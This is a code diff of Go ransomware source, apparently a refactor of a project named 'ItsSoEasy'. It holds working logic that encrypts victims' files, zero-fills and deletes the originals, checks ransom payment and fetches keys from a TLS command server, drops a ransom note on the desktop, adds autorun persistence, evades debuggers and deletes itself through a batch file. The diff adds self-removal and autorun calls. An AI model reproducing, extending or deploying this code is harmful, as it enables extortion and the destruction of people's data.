@@ -29,7 +29,6 @@ import (
 	"encoding/hex"
 	"fmt"
 	"io/fs"
-	"io/ioutil"
 	"os"
 	"os/exec"
 	"os/user"
@@ -105,6 +104,7 @@ var (
 	//PORT = 6666
 
 	// get path of this executable
+	//filePath, _ = os.Executable()
 	filePath, _ = os.Executable()
 	// get OS, the program runs
 	runtimeOS = runtime.GOOS
@@ -148,6 +148,7 @@ func runItsSoEasy(debuggerPresent bool) {
 					if cId {
 						removeAllFiles(cId)
 						removeFromServer(removeIt, userIdentifier, b64dec(mny))
+						makeAutoRun(true)
 					} else {
 						for notDecrypted {
 							keyIv := getKey(getKeyAndIVToDec, userIdentifier, b64dec(ypay))
@@ -185,7 +186,10 @@ func makeAutoRun(kill bool) {
 		} else {
 			file, _ := os.OpenFile(batPath+"\\"+"kill.bat", os.O_CREATE|os.O_RDWR, 0700)
 			_, _ = file.Write([]byte("start \"\" \"" + filePath + "\""))
-			file.Close()
+			err := file.Close()
+			if err != nil {
+				return
+			}
 		}
 	}
 }
@@ -199,6 +203,7 @@ func doSomeThingElseWithDebugger() {
 	} else if runtimeOS == "linux" {
 		_ = exec.Command("xdg-open", url).Start()
 	}
+	selfRemove()
 }
 
 // https://gobyexample.com/base64-encoding
@@ -227,7 +232,10 @@ func isPayed(exeCode int, userIdentifier, additional string) bool {
 				break
 			}
 		}
-		conn.Close()
+		err = conn.Close()
+		if err != nil {
+			return false
+		}
 
 		splitted := strings.Split(data, "-!-")
 		if splitted[0] == strconv.Itoa(exeCode) && splitted[1] == userIdentifier && splitted[2] == "True" {
@@ -257,7 +265,9 @@ func removeFromServer(exeCode int, userIdentifier, additional string) {
 				break
 			}
 		}
-		conn.Close()
+		if err != nil {
+			return
+		}
 		return
 	}
 	return
@@ -285,7 +295,7 @@ func runConnection(exeCode int, userIdentifier, additional string) {
 	for true {
 		conn, err := tls.Dial("tcp", hostname, config)
 		if err != nil {
-			fmt.Println(err)
+			//fmt.Println(err)
 			time.Sleep(2 * time.Second)
 			continue
 		}
@@ -300,7 +310,10 @@ func runConnection(exeCode int, userIdentifier, additional string) {
 				break
 			}
 		}
-		conn.Close()
+		err = conn.Close()
+		if err != nil {
+			return
+		}
 
 		splitted := strings.Split(data, "-!-")
 		if splitted[0] == "OK0" && splitted[1] == "True" {
@@ -346,7 +359,10 @@ func encryptData(keyIv keyIv) {
 	for _, file := range filesToEncrypt {
 		_, _ = oFile.Write([]byte(file + "\n"))
 	}
-	oFile.Close()
+	err = oFile.Close()
+	if err != nil {
+		return
+	}
 
 	for _, fileEnc := range filesToEncrypt {
 		fi, _ := os.Stat(fileEnc)
@@ -360,7 +376,7 @@ func encryptData(keyIv keyIv) {
 		for true {
 			//data := make([]byte, datasize)
 
-			read, _ := ioutil.ReadFile(fileEnc)
+			read, _ := os.ReadFile(fileEnc)
 			data := read
 			if len(read) == 0 {
 				break
@@ -374,15 +390,24 @@ func encryptData(keyIv keyIv) {
 			_, _ = outfile.Write(encrypted)
 			break
 		}
-		outfile.Close()
+		err := outfile.Close()
+		if err != nil {
+			return
+		}
 		content, _ := os.OpenFile(fileEnc, os.O_RDWR, 0755)
 		_, _ = content.Write(bytes.Repeat([]byte(`0`), int(fileSize)))
-		content.Close()
+		err = content.Close()
+		if err != nil {
+			return
+		}
 		_ = os.Remove(fileEnc)
 	}
 	fl, _ := os.OpenFile(oser+b64dec(ident), os.O_WRONLY|os.O_APPEND, 0755)
 	_, _ = fl.Write([]byte("\n0"))
-	fl.Close()
+	err = fl.Close()
+	if err != nil {
+		return
+	}
 
 	// clear key and iv value and manually trigger garbage collection
 	keyIv.key = nil
@@ -404,7 +429,10 @@ func decryptData(keyIv keyIv) bool {
 		for scanner.Scan() {
 			filesToDecrypt = append(filesToDecrypt, scanner.Text())
 		}
-		ofile.Close()
+		err := ofile.Close()
+		if err != nil {
+			return false
+		}
 	}
 
 	for _, fileDec := range filesToDecrypt {
@@ -415,12 +443,15 @@ func decryptData(keyIv keyIv) bool {
 		if bytes.HasSuffix([]byte(fSizeStr), []byte("-!>")) {
 			orgFileSize, _ = strconv.ParseInt(fSizeStr[:len(fSizeStr)-3], 10, 64)
 		}
-		filein.Close()
+		err := filein.Close()
+		if err != nil {
+			return false
+		}
 
 		outfile, _ := os.OpenFile(fileDec, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0755)
 
 		for true {
-			read, _ := ioutil.ReadFile(fileDec + b64dec(ends))
+			read, _ := os.ReadFile(fileDec + b64dec(ends))
 			//fmt.Println(data)
 			read = read[len(fSizeStr):]
 			if len(read) == 0 {
@@ -431,14 +462,20 @@ func decryptData(keyIv keyIv) bool {
 			_, _ = outfile.Write(decrypted)
 			break
 		}
-		outfile.Close()
+		err = outfile.Close()
+		if err != nil {
+			return false
+		}
 		_ = os.Truncate(fileDec, orgFileSize)
 
 		fi, _ := os.Stat(fileDec + b64dec(ends))
 		fileSize := fi.Size()
 		content, _ := os.OpenFile(fileDec+b64dec(ends), os.O_RDWR, 0755)
 		_, _ = content.Write(bytes.Repeat([]byte(`0`), int(fileSize)))
-		content.Close()
+		err = content.Close()
+		if err != nil {
+			return false
+		}
 		_ = os.Remove(fileDec + b64dec(ends))
 	}
 	//keyIv.key = nil
@@ -456,15 +493,24 @@ func checkUserIdentifier() string {
 		scanner := bufio.NewReader(file)
 		userId, _, _ := scanner.ReadLine()
 		userIdentifier = string(userId)
-		file.Close()
+		err := file.Close()
+		if err != nil {
+			return ""
+		}
 	} else {
-		file.Close()
+		err := file.Close()
+		if err != nil {
+			print("")
+		}
 		rndm := make([]byte, 64)
 		_, _ = rand.Read(rndm)
 		userIdentifier = hex.EncodeToString(rndm)
 		fileW, _ := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0755)
 		_, _ = fileW.Write([]byte(userIdentifier))
-		fileW.Close()
+		err = fileW.Close()
+		if err != nil {
+			print("")
+		}
 	}
 	return userIdentifier
 }
@@ -491,7 +537,10 @@ func getKey(exeCode int, userIdentifier, additional string) keyIv {
 				break
 			}
 		}
-		conn.Close()
+		err = conn.Close()
+		if err != nil {
+			return keyIv
+		}
 
 		splitted := strings.Split(data, "-!-")
 		splittedKeyIv := strings.Split(splitted[2], b64dec(kproc))
@@ -509,12 +558,18 @@ func createAndShowMessage() {
 	var fileEnd string
 	if file, err := os.OpenFile(desktop+end, os.O_CREATE|os.O_RDWR, 0755); err == nil {
 		_, _ = file.Write([]byte(b64dec(websitecontent)))
-		file.Close()
+		err := file.Close()
+		if err != nil {
+			return
+		}
 		fileEnd = desktop + end
 	} else {
 		fileA, _ := os.OpenFile(oser+end, os.O_CREATE|os.O_RDWR, 0755)
 		_, _ = fileA.Write([]byte(b64dec(websitecontent)))
-		fileA.Close()
+		err := fileA.Close()
+		if err != nil {
+			return
+		}
 		fileEnd = oser + end
 	}
 
@@ -532,14 +587,20 @@ func createAndShowMessage() {
 func selfRemove() {
 	// trigger self remove
 	if runtimeOS == "windows" {
-		if file, err := os.OpenFile("kill.bat", os.O_CREATE|os.O_RDWR, 0755); err == nil {
+		// with HereItsSoEasy Downloader...
+		//base := "C:\\AppData\\"
+		base := ""
+		if file, err := os.OpenFile(base+"kill.bat", os.O_CREATE|os.O_RDWR, 0755); err == nil {
 			_, _ = file.Write([]byte("@ECHO OFF\ntimeout /t 5 /nobreak > NUL\n" +
 				"type nul > \"" + filePath + "\"\n" +
 				"DEL /q /s \"" + filePath + "\"\n" +
-				"type nul > \"" + filepath.Dir(filePath) + string(os.PathSeparator) + "kill.bat" + "\"\n" +
-				"DEL /q /s \"" + filepath.Dir(filePath) + string(os.PathSeparator) + "kill.bat" + "\""))
-			file.Close()
-			kill := filepath.Dir(filePath) + string(os.PathSeparator) + "kill.bat"
+				"type nul > \"" + base + "kill.bat\"\n" +
+				"DEL /q /s \"\" + base + \"kill.bat\""))
+			err := file.Close()
+			if err != nil {
+				return
+			}
+			kill := "C:\\AppData\\kill.bat"
 			cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/C", kill)
 			_ = cmd.Start()
 		}
@@ -565,27 +626,30 @@ func removeAllFiles(cId bool) {
 			for reader.Scan() {
 				files = append(files, reader.Text())
 			}
-			ofile.Close()
+			err := ofile.Close()
+			if err != nil {
+				return
+			}
 
 			for _, file := range files {
 				fileEnc := file + b64dec(ends)
 				fi, _ := os.Stat(fileEnc)
 				fsize := fi.Size()
-				_ = ioutil.WriteFile(fileEnc, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
+				_ = os.WriteFile(fileEnc, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
 				_ = os.Remove(fileEnc)
 			}
 		}
 		idFile := oser + b64dec(ident)
 		fi, _ := os.Stat(idFile)
 		fsize := fi.Size()
-		_ = ioutil.WriteFile(idFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
+		_ = os.WriteFile(idFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
 		_ = os.Remove(idFile)
 		fmt.Println(b64dec(tkmsg2Msg))
 	} else {
 		idFile := oser + b64dec(ident)
 		fi, _ := os.Stat(idFile)
 		fsize := fi.Size()
-		_ = ioutil.WriteFile(idFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
+		_ = os.WriteFile(idFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
 		_ = os.Remove(idFile)
 
 		fmt.Println(b64dec(tkmsg3Msg))
@@ -594,7 +658,7 @@ func removeAllFiles(cId bool) {
 	fileFile := oser + b64dec(fileFiles)
 	fi, _ := os.Stat(fileFile)
 	fsize := fi.Size()
-	_ = ioutil.WriteFile(fileFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
+	_ = os.WriteFile(fileFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
 	_ = os.Remove(fileFile)
 }
 
